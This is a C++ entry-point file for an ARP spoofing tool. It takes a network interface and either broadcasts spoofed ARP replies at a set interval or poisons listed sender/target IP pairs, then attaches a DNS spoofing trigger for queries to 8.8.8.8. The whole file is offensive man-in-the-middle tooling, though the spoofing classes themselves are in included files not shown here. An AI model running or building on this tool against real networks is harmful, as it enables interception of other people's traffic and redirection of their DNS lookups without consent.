#include <iostream>
#include <vector>
#include "util/FormatTools.cpp"
#include "util/NetTools.cpp"
#include "spoof/SessionARPSpoofing.cpp"
#include "spoof/BroadcastARPSpoofing.cpp"
#include "spoof/trigger/DNSSpoofingTrigger.cpp"

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "WARNING: failed load network-interface" << std::endl;
        return 1;
    } else std::cout << "INFO: network-interface at " << argv[1] << std::endl;

    IBaseARPSpoofing* arpSpoofingManager;

    if (argc < 4) {
        std::cout << "INFO: broadcast arp-spoofing..." << std::endl;
        int sendFeq = 2;
        if (argc == 3) {
            auto vSendFeq = FormatTools::strToInt(argv[2]);
            if (vSendFeq) sendFeq = vSendFeq.value();
            else std::cout << "WARNING: invalid nature number: " << argv[2] << std::endl;
        }
        std::cout << "INFO: broadcast frequency set at " << sendFeq << " seconds" << std::endl;

        arpSpoofingManager = new BroadcastARPSpoofing(argv[1], sendFeq);
    } else {
        int pair_count = argc / 2 - 1;
        std::cout << "INFO: total sessions: " << pair_count << std::endl;
        auto sessionList = std::vector<std::pair<uint8_t*, uint8_t*>>(pair_count);
        for (int i = 1; pair_count + 1 > i; i++) {
            auto senderIP = FormatTools::strToIP(argv[i * 2]);
            auto targetIp = FormatTools::strToIP(argv[i * 2 + 1]);
            if (!senderIP or !targetIp) {
                std::cout << "ERROR: invalid session-pair: " << argv[i * 2] << " <=> " << argv[i * 2 + 1]
                          << std::endl;
                return 1;
            }
            std::cout << "INFO: success parse session-pair: " << argv[i * 2] << " <=> " << argv[i * 2 + 1] << std::endl;
            sessionList[i - 1] = std::make_pair(senderIP.value(), targetIp.value());
        }

        auto sessionARPSpoofing = new SessionARPSpoofing(argv[1], sessionList);

        char targetDNSServer[] = "8.8.8.8";
        sessionARPSpoofing->registerTrigger(new DNSSpoofingTrigger(targetDNSServer));

        arpSpoofingManager = sessionARPSpoofing;
    }

    std::cout << "INFO: start spoof-spoofing" << std::endl;

    arpSpoofingManager->startARPSpoofing(IBaseARPSpoofing::SESSION_TIME_10M);

    std::cout << "INFO: end spoof-spoofing; timeout." << std::endl;
    return 0;
}
